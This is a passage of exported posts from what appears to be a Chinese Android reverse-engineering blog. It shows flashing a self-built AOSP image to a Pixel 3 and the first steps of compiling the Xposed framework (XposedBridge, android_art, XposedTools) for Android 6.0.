src=\"https://images.sunofbeaches.com/content/2022_11_22/1044711823166668800.jpg\" alt=\"图片描述\"></p>\n<p>我们的手机pixel3就选择blueline这个产品，userdebug模式刷机完成就打开adb调试，有su。</p>\n<p><img src=\"https://images.sunofbeaches.com/content/2022_11_22/1044712280933007360.jpg\" alt=\"图片描述\"></p>\n<p>开始编译：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">make -j4</span><br><span class=\"line\">回车</span><br><span class=\"line\"></span><br><span class=\"line\">由于配置低就用4线程编译，如果你配置高，就配置多点</span><br></pre></td></tr></table></figure>\n\n<p>开始后你可能会遇到这个错误：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">test github.com/google/blueprint/pathtools</span><br><span class=\"line\">FAILED: out/soong/.bootstrap/blueprint-pathtools/test/test.passed</span><br><span class=\"line\">out/soong/.bootstrap/bin/gotestrunner -p ./build/blueprint/pathtools -f out/soong/.bootstrap/blueprint-pathtools/test/test.passed -- out/soong/.bootstrap/blueprint-pathtools/test/test -test.short</span><br><span class=\"line\">--- FAIL: TestGlobEscapes (0.02s)</span><br><span class=\"line\">    --- FAIL: TestGlobEscapes/**/* (0.02s)</span><br><span class=\"line\">        glob_test.go:562: incorrect matches list:</span><br><span class=\"line\">        glob_test.go:562:  pattern: &quot;**/*&quot;</span><br><span class=\"line\">        glob_test.go:562:      got: []string&#123;&quot;a/&quot;, &quot;b&quot;, &quot;a/a&quot;&#125;</span><br><span class=\"line\">        glob_test.go:562: expected: []string&#123;&quot;*&quot;, &quot;**/&quot;, &quot;?&quot;, &quot;a/&quot;, &quot;b&quot;, &quot;**/*&quot;, &quot;**/a&quot;, &quot;**/b/&quot;, &quot;**/b/b&quot;, &quot;a/a&quot;&#125;</span><br><span class=\"line\">        glob_test.go:562: incorrect deps list:</span><br><span class=\"line\">        glob_test.go:562:  pattern: &quot;**/*&quot;</span><br><span class=\"line\">        glob_test.go:562:      got: []string&#123;&quot;.&quot;, &quot;a&quot;&#125;</span><br><span class=\"line\">        glob_test.go:562: expected: []string&#123;&quot;.&quot;, &quot;**&quot;, &quot;**/b&quot;, &quot;a&quot;&#125;</span><br><span class=\"line\">    --- FAIL: TestGlobEscapes/**/\\* (0.00s)</span><br><span class=\"line\">        glob_test.go:562: incorrect matches list:</span><br><span class=\"line\">        glob_test.go:562:  pattern: &quot;**/\\\\*&quot;</span><br><span class=\"line\">        glob_test.go:562:      got: []string(nil)</span><br><span class=\"line\">        glob_test.go:562: expected: []string&#123;&quot;*&quot;, &quot;**/*&quot;&#125;</span><br><span class=\"line\">        glob_test.go:562: incorrect deps list:</span><br><span class=\"line\">        glob_test.go:562:  pattern: &quot;**/\\\\*&quot;</span><br><span class=\"line\">        glob_test.go:562:      got: []string&#123;&quot;.&quot;, &quot;a&quot;&#125;</span><br><span class=\"line\">        glob_test.go:562: expected: []string&#123;&quot;.&quot;, &quot;**&quot;, &quot;**/b&quot;, &quot;a&quot;&#125;</span><br><span class=\"line\">    --- FAIL: TestGlobEscapes/\\*\\*/* (0.00s)</span><br><span class=\"line\">        glob_test.go:562: incorrect matches list:</span><br><span class=\"line\">        glob_test.go:562:  pattern: &quot;\\\\*\\\\*/*&quot;</span><br><span class=\"line\">        glob_test.go:562:      got: []string(nil)</span><br><span class=\"line\">        glob_test.go:562: expected: []string&#123;&quot;**/*&quot;, &quot;**/a&quot;, &quot;**/b/&quot;&#125;</span><br><span class=\"line\">        glob_test.go:562: incorrect deps list:</span><br><span class=\"line\">        glob_test.go:562:  pattern: &quot;\\\\*\\\\*/*&quot;</span><br><span class=\"line\">        glob_test.go:562:      got: []string&#123;&quot;.&quot;&#125;</span><br><span class=\"line\">        glob_test.go:562: expected: []string&#123;&quot;.&quot;, &quot;**&quot;&#125;</span><br><span class=\"line\">    --- FAIL: TestGlobEscapes/\\*\\*/**/* (0.00s)</span><br><span class=\"line\">        glob_test.go:562: incorrect matches list:</span><br><span class=\"line\">        glob_test.go:562:  pattern: &quot;\\\\*\\\\*/**/*&quot;</span><br><span class=\"line\">        glob_test.go:562:      got: []string(nil)</span><br><span class=\"line\">        glob_test.go:562: expected: []string&#123;&quot;**/*&quot;, &quot;**/a&quot;, &quot;**/b/&quot;, &quot;**/b/b&quot;&#125;</span><br><span class=\"line\">        glob_test.go:562: incorrect deps list:</span><br><span class=\"line\">        glob_test.go:562:  pattern: &quot;\\\\*\\\\*/**/*&quot;</span><br><span class=\"line\">        glob_test.go:562:      got: []string&#123;&quot;.&quot;&#125;</span><br><span class=\"line\">        glob_test.go:562: expected: []string&#123;&quot;.&quot;, &quot;**&quot;, &quot;**/b&quot;&#125;</span><br><span class=\"line\">FAIL</span><br><span class=\"line\">18:54:13 soong bootstrap failed with: exit status 1</span><br></pre></td></tr></table></figure>\n\n<p>根据这个博客的方法，可以解决<a href=\"https://www.cnblogs.com/juwan/p/16848838.html%E3%80%82\">https://www.cnblogs.com/juwan/p/16848838.html。</a></p>\n<p>就是把源码根目录下build&#x2F;blueprint&#x2F;Blueprints:71: “pathtools&#x2F;glob_test.go”和fs_test.go删除了保存就好了，找了几个小时的错误，就这个有用。</p>\n<p>继续make -j4。</p>\n<p><img src=\"https://images.sunofbeaches.com/content/2022_11_22/1044713710360199168.jpg\" alt=\"图片描述\"></p>\n<p>编译完成。</p>\n<h2 id=\"五、刷入手机pixel3中\"><a href=\"#五、刷入手机pixel3中\" class=\"headerlink\" title=\"五、刷入手机pixel3中\"></a>五、刷入手机pixel3中</h2><p>注意条件：</p>\n<p>1：pixel3解开bl锁</p>\n<p>2：必须退出登录的所有google账号，后果自负（懂的都懂）</p>\n<p>3：usb接口已经配置好访问权限。</p>\n<p>开始刷机。</p>\n<p>手机连接电脑，触发虚拟机选择连接的设备，选择虚拟机就行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">adb devices</span><br><span class=\"line\"></span><br><span class=\"line\">检查手机状态，如果已经连接会显示</span><br><span class=\"line\">sfasdfadf  devices</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我在这里遇到问题，我的手机之前系统是Android9，和现在编译的代码版本不一样，而且boot给我修改过的。</p>\n<p>如果直接刷机，可能会遇到这样的错误。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">fastboot flashall -w</span><br><span class=\"line\">--------------------------------------------</span><br><span class=\"line\">Bootloader Version...: b4s4-0.1-5613380</span><br><span class=\"line\">Baseband Version.....: g670-00011-190411-B-5457439</span><br><span class=\"line\">Serial Number........: XXXXXXXXXX</span><br><span class=\"line\">--------------------------------------------</span><br><span class=\"line\">Checking &#x27;product&#x27;                                 OKAY [  0.057s]</span><br><span class=\"line\">Setting current slot to &#x27;a&#x27;                        OKAY [  0.372s]</span><br><span class=\"line\">Sending &#x27;boot_a&#x27; (65536 KB)                        OKAY [  1.850s]</span><br><span class=\"line\">Writing &#x27;boot_a&#x27;                                   OKAY [  0.349s]</span><br><span class=\"line\">Sending &#x27;dtbo_a&#x27; (8192 KB)                         OKAY [  0.320s]</span><br><span class=\"line\">Writing &#x27;dtbo_a&#x27;                                   OKAY [  0.095s]</span><br><span class=\"line\">Sending &#x27;vbmeta_a&#x27; (4 KB)                          OKAY [  0.120s]</span><br><span class=\"line\">Writing &#x27;vbmeta_a&#x27;                                 OKAY [  0.066s]</span><br><span class=\"line\">Rebooting into fastboot                            FAILED (remote: &#x27;Unsupported reboot option reboot-fastboot&#x27;)</span><br><span class=\"line\">fastboot: error: Command failed</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>然后手机就挂了</p>\n<p><img src=\"https://images.sunofbeaches.com/content/2022_11_22/1044715158103916544.jpg\" alt=\"图片描述\"></p>\n<p>查了资料，说是引导和当前编译的系统版本的不一样。</p>\n<p>去这个地址：<a href=\"https://developers.google.com/android/images#blueline\">https://developers.google.com/android/images#blueline</a></p>\n<p><img src=\"https://images.sunofbeaches.com/content/2022_11_22/1044716035183214592.jpg\" alt=\"图片描述\"></p>\n<p>下载完成之后，解压zip，然后手机连接电脑，手机开机和音量下一起按住，等待进入BootLoader模式。</p>\n<p>进入模式之后，电脑如果win，双击flash-all.bat,Mac和Linux执行.&#x2F;flash-all.sh就行。进入刷机，可能重启数次。</p>\n<p>刷机完成之后，打开开发者模式，再次连接电脑，虚拟机连接手机。</p>\n<p>进入源码根目录中，配置下fastboot。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">cd out/host/linux-x86/bin</span><br><span class=\"line\"></span><br><span class=\"line\">执行</span><br><span class=\"line\"></span><br><span class=\"line\">sudo chown root:root fastboot &amp;&amp; sudo chmod +s fastboot</span><br><span class=\"line\"></span><br><span class=\"line\">输入你的虚拟机密码，回车。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>回到根目录下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">ANDROID_PRODUCT_OUT=out/target/product/blueline</span><br></pre></td></tr></table></figure>\n\n<p>开始刷机</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">如果你的手机开机，先重启</span><br><span class=\"line\">adb reboot bootloader</span><br><span class=\"line\"></span><br><span class=\"line\">重启到bootloader后</span><br><span class=\"line\"></span><br><span class=\"line\">fastboot devices</span><br><span class=\"line\"></span><br><span class=\"line\">看看手机连接情况</span><br><span class=\"line\"></span><br><span class=\"line\">fastboot flashall -w</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://images.sunofbeaches.com/content/2022_11_22/1044713463819010048.jpg\" alt=\"图片描述\"></p>\n<p>手机重启之后，虚拟机选择连接的手机设备就行了，重启多次。</p>\n<p><img src=\"https://images.sunofbeaches.com/content/2022_11_22/1044717894941802496.jpg\" alt=\"图片描述\"></p>\n<p>这个时候手机会自动重启。</p>\n<p><img src=\"https://images.sunofbeaches.com/content/2022_11_22/1044718038844178432.png\" alt=\"图片描述\"></p>\n<p>开始玩耍吧~</p>\n","categories":["Android源码定制"],"tags":["逆向技术","源码定制"]},{"title":"Android源码定制（3）——Xposed源码编译详解","url":"/2022/12/04/code3/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>在上篇帖子中我们完成了Android 6.0 从源码下载到源码编译的全过程，详细可以参考<a href=\"https://bbs.pediy.com/thread-269575.htm\">源码编译（1）——Android6.0源码编译详解</a>，本文主要讲解Xposed框架源码编译到源码定制的详细过程，实验环境主要是Android 6.0，在此过程中踩过不少坑，遇到各种问题，好在后面都一一解决了，这个过程中尤其感谢一些大佬的博客贴子，从中学习到了很多。本文将从基于我们编译的Android 6.0，从Xposed源码编译到Xposed源码定制，详细记录全过程。此实验分为两部分：本文Xposed源码编译和下文Xposed源码定制</p>\n<span id=\"more\"></span>\n<p><strong>致谢：</strong></p>\n<p>首先感谢世界美景大佬的<a href=\"https://bbs.pediy.com/thread-255836.htm\">定制Xposed框架</a>，从里面学习到对Xposed框架特征的修改，但是由于个人水平有限，大佬的贴子不够详细，不能完整复现，经过搜索发现肉丝大佬的基于此的两篇详细的贴子讲解：<a href=\"https://mp.weixin.qq.com/s/c97zoTxRrEeYLvD8YwIUVQ\">来自高纬的对抗：魔改XPOSED过框架检测(上)</a>和<a href=\"https://mp.weixin.qq.com/s/YAMCrQSi0LFJGNIwB9qHDA\">来自高纬的对抗：魔改XPOSED过框架检测(下)</a>，本文的Xposed定制详细参考了大佬的贴子，一些bug也是从中得到了解决，而Xposed编译则参考博客：<a href=\"https://www.jianshu.com/p/6471bab49cb1\">xposed源码编译与集成</a>，关于Xposed安装以及问题解决则参考：<a href=\"https://bbs.pediy.com/thread-264160.htm\">学习篇-xposed框架及高版本替代方案</a></p>\n<h2 id=\"二、Xposed源码编译\"><a href=\"#二、Xposed源码编译\" class=\"headerlink\" title=\"二、Xposed源码编译\"></a>二、Xposed源码编译</h2><h3 id=\"1-实验准备\"><a href=\"#1-实验准备\" class=\"headerlink\" title=\"1.实验准备\"></a>1.实验准备</h3><p>Xposed源码编译的过程中，我们需要详细的了解Xposed中不同模块对应的版本以及适配的Android 版本情况，这样能够帮助我们减少错误，本文实验的环境搭建为：</p>\n<table>\n<thead>\n<tr>\n<th><strong>实验平台：</strong></th>\n<th><strong>Ubuntu 16.0.4  (运行内存4GB+CPU 4+磁盘300G)</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Android源码：</strong></td>\n<td><strong>android-6.0.1_r1</strong></td>\n</tr>\n<tr>\n<td><strong>实验手机：</strong></td>\n<td><strong>Google nexus5</strong></td>\n</tr>\n<tr>\n<td><strong>XposedBridge：</strong></td>\n<td><strong>XposedBridge-art</strong></td>\n</tr>\n<tr>\n<td><strong>XposedInstaller:</strong></td>\n<td><strong>3.1.5</strong></td>\n</tr>\n</tbody></table>\n<h3 id=\"2-编译流程\"><a href=\"#2-编译流程\" class=\"headerlink\" title=\"2.编译流程\"></a>2.编译流程</h3><p>我们在学习Xposed的源码编译之前，我们先了解Xposed个各个模块的含义，详细参考官网：<a href=\"https://github.com/rovo89\">Xposed官网</a></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/2.png\" alt=\"image-20211001164001995\"></p>\n<p>各个模块的含义（这里参考上文肉丝大佬博客（1））：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">XposedInstaller：下载安装Xposed.zip刷机包、下载安装和管理模块</span><br><span class=\"line\">XposedBridge：位于Java层的API提供者，模块调用功能时首先就是到这里，然后再“转发”到Native方法</span><br><span class=\"line\">Xposed：位于Native层的Xposed实际实现，实现方法替换的实际逻辑等功能，主要是在app_process上进行的二次开发</span><br><span class=\"line\">android_art：在原版art上进行的二次开发，目录及文件基本上与原版art相同，稍加修改提供对Xposed的支持</span><br><span class=\"line\">XposedTools:XposedInstaller下载的那个刷机zip包，就是用XposedTools编译打包出来的</span><br></pre></td></tr></table></figure>\n\n<p>我们了解Xposed的各个模块的作用，接着了解一下Xposed框架初始化的工作原理：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/3.png\" alt=\"image-20211001165501914\"></p>\n<p>Xposed源码编译的流程可以参考下图：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/1.png\" alt=\"image-20211001163008900\"></p>\n<h3 id=\"3-XposedBridge\"><a href=\"#3-XposedBridge\" class=\"headerlink\" title=\"3.XposedBridge\"></a>3.XposedBridge</h3><h4 id=\"（1）源码下载\"><a href=\"#（1）源码下载\" class=\"headerlink\" title=\"（1）源码下载\"></a>（1）源码下载</h4><p>我们从官网上下载<a href=\"https://github.com/rovo89/XposedBridge/tree/art\">XposedBridge</a>，这里我们最终下载的是Xposed_art</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https:<span class=\"comment\">//github.com/rovo89/XposedBridge.git</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/4.png\" alt=\"image-20211001163008900\"></p>\n<h4 id=\"（2）编译生成XposedBridge-jar\"><a href=\"#（2）编译生成XposedBridge-jar\" class=\"headerlink\" title=\"（2）编译生成XposedBridge.jar\"></a>（2）编译生成XposedBridge.jar</h4><p>我们在生成XposedBridge.jar的过程中有两种方式：mmm编译和Android Studio编译（这里优先推荐使用AndroidStudio编译）</p>\n<h5 id=\"lt-1-gt-mmm编译\"><a href=\"#lt-1-gt-mmm编译\" class=\"headerlink\" title=\"&lt;1&gt;mmm编译\"></a>&lt;1&gt;mmm编译</h5><p>首先我们需要在XposedBridge工程中编写Android.mk文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android.mk是Android提供的一种makefile文件，用来指定诸如编译生成so库名、引用的头文件目录、需要编译的.c/.cpp文件和.a静态库文件等。编写android.mk文件，将编译需要的源代码，编译生成的结果形式等信息告知ndk build编译系统。Android.mk文件内容如下所示。</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">LOCAL_PATH:= $(call my-dir)</span><br><span class=\"line\">include $(CLEAR_VARS)</span><br><span class=\"line\">LOCAL_DEX_PREOPT = <span class=\"literal\">false</span></span><br><span class=\"line\">LOCAL_MODULE := XposedBridge</span><br><span class=\"line\"></span><br><span class=\"line\">LOCAL_SRC_FILES := \\</span><br><span class=\"line\">     $(call all-java-files-under, src) \\</span><br><span class=\"line\">     $(call all-java-files-under, lib/apache-commons-lang/external) \\</span><br><span class=\"line\">     $(call all-java-files-under, hiddenapistubs/src)</span><br><span class=\"line\"></span><br><span class=\"line\">include $(BUILD_JAVA_LIBRARY)</span><br><span class=\"line\"></span><br><span class=\"line\">$(LOCAL_INTERMEDIA_TARGETS): PRIVATE_EXTRA_JAR_ARGS := -C <span class=\"string\">&quot;$(LOCAL_PATH)&quot;</span> \\</span><br><span class=\"line\">assets -C <span class=\"string\">&quot;#(LOCAL_PATH)&quot;</span> NOTICE.txt</span><br><span class=\"line\"></span><br><span class=\"line\">include $(call all-makefiles-under, $(LOCAL_PATH))</span><br></pre></td></tr></table></figure>\n\n<p>这里我们需要注意版本，针对不同版本的XposedBridge，我们需要修改LOCAL_SRC_FILES中的文件选项，关于Android.mk的文件介绍，大家可以参考官网地址：<a href=\"https://developer.android.com/ndk/guides/android_mk?hl=zh-cn\">Android.mk</a></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/5.png\" alt=\"image-20211001163008900\"></p>\n<p>我们将XposedBridge文件夹放在Android源码目录下</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/6.png\" alt=\"image-20211001163008900\"></p>\n<p>然后我们使用mmm针对模块编译：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">##初始化环境</span><br><span class=\"line\">source build/envsetup.sh</span><br><span class=\"line\">##选择设备</span><br><span class=\"line\">lunch <span class=\"number\">19</span></span><br><span class=\"line\">##编译</span><br><span class=\"line\">mmm /home/tom/SourceCode/android-<span class=\"number\">6.0</span>.1_r1/XposedBridge/ </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/7.png\" alt=\"image-20211001163008900\"></p>\n<p>我们就可以在&#x2F;out&#x2F;target&#x2F;product&#x2F;hammerhead&#x2F;system&#x2F;framework&#x2F;文件夹下看见生成的XposedBridge包</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/8.png\" alt=\"image-20211001163008900\"></p>\n<h5 id=\"lt-2-gt-android-Studio编译\"><a href=\"#lt-2-gt-android-Studio编译\" class=\"headerlink\" title=\"&lt;2&gt;android Studio编译\"></a>&lt;2&gt;android Studio编译</h5><p>我们先从官网上下载源码，然后我们直接用Android Studio打开</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/9.png\" alt=\"image-20211001163008900\"></p>\n<p>然后我们等待编译器默认配置，此时如果你的编译器没有安装sdk23，可能会报错</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/10.png\" alt=\"image-20211001172232509\"></p>\n<p>这里我们进入File→Settings→Android SDK→勾选Android 6.0(Marshmallow)→Apply→OK，就会开始下载Sources for Android 23</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/11.png\" alt=\"image-20211001172401367\"></p>\n<p>下载完成后，我们只需要将编译器重新关闭，再次打开即可</p>\n<p>其他的问题只需要按照编译器提示的缺失文件，点击安装，静静等待配置就可以了，详细的错误解决也可以参考肉丝的博客（一）</p>\n<p>然后我们点击<code>build下Make Project或Rebuild Project</code>就可以编译成功了，生成路径<code>build/outputs/apk/app-release-unsigned.apk</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/12.png\" alt=\"image-20211001172401367\"></p>\n<p>这里就编译生成不签名的apk，然后我们可以把apk重命名XposedBridge.jar</p>\n<p><strong>编译模块开发api.jar</strong></p>\n<p>如果我们需要提供给app调用的api，那么我们可以需要执行android studio的gradle project的other中的generateAPI选项，会在目录build&#x2F;api中生成apk.jar</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/13.png\" alt=\"image-20211001172401367\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/14.png\" alt=\"image-20211001173925091\"></p>\n<p>这里的api-sources.jar和XposedBridge中的就是一样的</p>\n<p>我们在这里就可以获得XposedBridge.jar和api.jar</p>\n<h4 id=\"（3）路径存放\"><a href=\"#（3）路径存放\" class=\"headerlink\" title=\"（3）路径存放\"></a>（3）路径存放</h4><p>我们android studio产生的XposedBridge.jar就可以放置在&#x2F;out&#x2F;target&#x2F;product&#x2F;hammerhead&#x2F;system&#x2F;framework&#x2F;文件夹下，而mmm编译的自动存防在该路径下，就不需要管</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/8.png\" alt=\"image-20211001163008900\"></p>\n<h3 id=\"4-android-art和Xposed\"><a href=\"#4-android-art和Xposed\" class=\"headerlink\" title=\"4.android_art和Xposed\"></a>4.android_art和Xposed</h3><h4 id=\"（1）源码下载-1\"><a href=\"#（1）源码下载-1\" class=\"headerlink\" title=\"（1）源码下载\"></a>（1）源码下载</h4><p>我们从Xposed官网下载<code>android_art</code>和<code>Xposed</code>源码，我们这里是android6.0，因此下载Xposed_sdk23，参考地址：<a href=\"https://github.com/rovo89\">Xposed官网地址</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">xposed文件夹包括xposed修改之后的app_process等应用程序和libxposed_*.so等库文件的源码；art文件夹主要包括xposed修改之后的art虚拟机的文件。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/15.png\" alt=\"image-20211001163008900\"></p>\n<h4 id=\"（2）android-art\"><a href=\"#（2）android-art\" class=\"headerlink\" title=\"（2）android_art\"></a>（2）android_art</h4><p>我们将我们下载的android_art文件夹重命名为art文件夹，然后替换android源码下的art文件夹，这就相当于替换了android系统的虚拟机</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/16.png\" alt=\"image-20211001163008900\"></p>\n<h4 id=\"（3）xposed\"><a href=\"#（3）xposed\" class=\"headerlink\" title=\"（3）xposed\"></a>（3）xposed</h4><p>将下载的xposed文件夹移动到<code>/SourceCode/Android-6.0.1_r1/frameworks/base/cmds/</code>文件夹下</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/17.png\" alt=\"image-20211001163008900\"></p>\n<p>注：这里我们注意下载的Xposed的首字母为大写，我们需要改成xposed，不然后面会报错，具体我们在错误专区中介绍</p>\n<h3 id=\"5-XposedTools\"><a href=\"#5-XposedTools\" class=\"headerlink\" title=\"5.XposedTools\"></a>5.XposedTools</h3><h4 id=\"（1）源码下载-2\"><a href=\"#（1）源码下载-2\" class=\"headerlink\" title=\"（1）源码下载\"></a>（1）源码下载</h4><p>我们从官网上下载XposedTools，官网地址：<a href=\"https://github.com/rovo89/XposedTools\">XposedTools</a></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/18.png\" alt=\"image-20211001163008900\"></p>\n<h4 id=\"（2）build-conf文件配置\"><a href=\"#（2）build-conf文件配置\" class=\"headerlink\" title=\"（2）build.conf文件配置\"></a>（2）build.conf文件配置</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\tbuild.conf文件是一个配置文件，会被build.pl读取使用。build文件中主要定义了编译xposed的结果的存放路径，android源码的路径，还有一些版本信息之类的值。</span><br><span class=\"line\">将下载的zip包解压，在文件夹下创建build.conf文件</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[General]</span><br><span class=\"line\">outdir = /home/tom/SourceCode/XposedBridge</span><br><span class=\"line\">[Build]</span><br><span class=\"line\">version = 65(custom build by author )</span><br><span class=\"line\">makeflags = -j4</span><br><span class=\"line\">[AospDir]</span><br><span class=\"line\">23 =/home/tom/SourceCode/android-6.0.1_r1</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">outdir指向的路径是xposed编译之后生成的文件的存放路径。</span><br><span class=\"line\">version的值和后边的参数是自己设置的。编译之后会写入到xposed.prop文件中，后面会显示在我们的XposedInstaller中</span><br><span class=\"line\">makeflags是设置在后边编译过程中使用的线程数。</span><br><span class=\"line\">AospDir指向的路径是android源码存放的路径，前边的值是源码对应的SDK的版本号。这里我指向的是android6<span class=\"number\">.0</span><span class=\"number\">.1</span>的源码，对应的android sdk的版本是<span class=\"number\">23</span>。</span><br></pre></td></tr></table></figure>\n\n<p>我们还需要在outdir目录下创建一个java文件夹，然后将上面生成的XposedBridge.jar放到java文件夹下</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/19.png\" alt=\"image-20211001163008900\"></p>\n<h4 id=\"（3）build-pl编译Xposed源码\"><a href=\"#（3）build-pl编译Xposed源码\" class=\"headerlink\" title=\"（3）build.pl编译Xposed源码\"></a>（3）build.pl编译Xposed源码</h4><p>build.pl文件在xposed tools文件夹下，在文件中有对build.pl文件的参数的设置规则等信息</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/20.png\" alt=\"image-20211001163008900\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">从上图可以看到build.pl主要可以完成的工作有四个，分别是编译生成xposed的可执行程序和库文件，将编译之后的文件拷贝到配置文件指定的输出路径下，创建xposed.prop文件，创建flashable ZIP文件。在参数中可以使用-t 针对指定的目标进行创建,在xposed tools目录下运行</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./build.pl -t arm:23</span><br></pre></td></tr></table></figure>\n\n<p>然后报错，这个是我们缺失依赖包</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/21.png\" alt=\"image-20211001163008900\"></p>\n<p>  build arm files for SDK23(对应的是Android6.0系统)  在执行过程中，可能会提示缺少一些依赖包，例如可能会缺少Config::IniFiles，使用apt-cache search  Config::IniFiles搜索，安装缺少的包即可</p>\n<p><strong>安装Config::IniFiles</strong></p>\n<p>先安装perl环境</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">apt-cache search Config::IniFiles</span><br><span class=\"line\">sudo apt install libconfig-inifiles-perl</span><br></pre></td></tr></table></figure>\n\n<p>然后我们再安装Config::IniFiles</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo perl -MCPAN -e <span class=\"string\">&#x27;install Config::IniFiles&#x27;</span></span><br><span class=\"line\">sudo perl -MCPAN -e <span class=\"string\">&#x27;install File::Tail&#x27;</span></span><br><span class=\"line\">sudo perl -MCPAN -e <span class=\"string\">&#x27;install File::ReadBackwards&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>这里我们就安装了缺失的环境，然后我们再次编译</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/22.png\" alt=\"image-20211001163008900\"></p>\n<h4 id=\"（4）生成编译结果\"><a href=\"#（4）生成编译结果\" class=\"headerlink\" title=\"（4）生成编译结果\"></a>（4）生成编译结果</h4><p>build.pl -t运行结束之后，会将生成的xposed的可执行程序和so库等文件放入到build.conf配置文件中指定的输出目录下。包括lib文件夹下的五个so库和bin文件加下的四个可执行程序以及一个配置文件。</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/23.png\" alt=\"image-20211001163008900\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/24.png\" alt=\"image-20211001163008900\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/25.png\" alt=\"image-20211001163008900\"></p>\n<p>我们还可以发现sdk23下生成xposed-v65-sdk23-arm-custom-build-by-author.zip，这就是我们下载的xposed压缩文件</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/26.png\" alt=\"image-20211001191539395\"></p>\n<p>我们可以看一下Xposed框架压缩文件与SDK的匹配关系，下载的参考网址：<a href=\"https://dl-xda.xposed.info/framework/\">Xposedsdk</a>（图片来源：<a href=\"https://bbs.pediy.com/thread-264160.htm\">学习篇-xposed框架及高版本替代方案</a>）</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code3/36.png\" alt=\"image-20211001195218356\"></p>\n<h3 id=\"6-XposedInstaller\"><a href=\"#6-XposedInstaller\" class=\"headerlink\" title=\"6.XposedInstaller\"></a>6.XposedInstaller</h3><h4 id=\"（1）源码下载-3\"><a href=\"#（1）源码下载-3\" class=\"headerlink\" title=\"（1）源码下载\"></a>（1）源码下载</h4><p>我们从官网上下载XposedInstaller，官网地址：<a 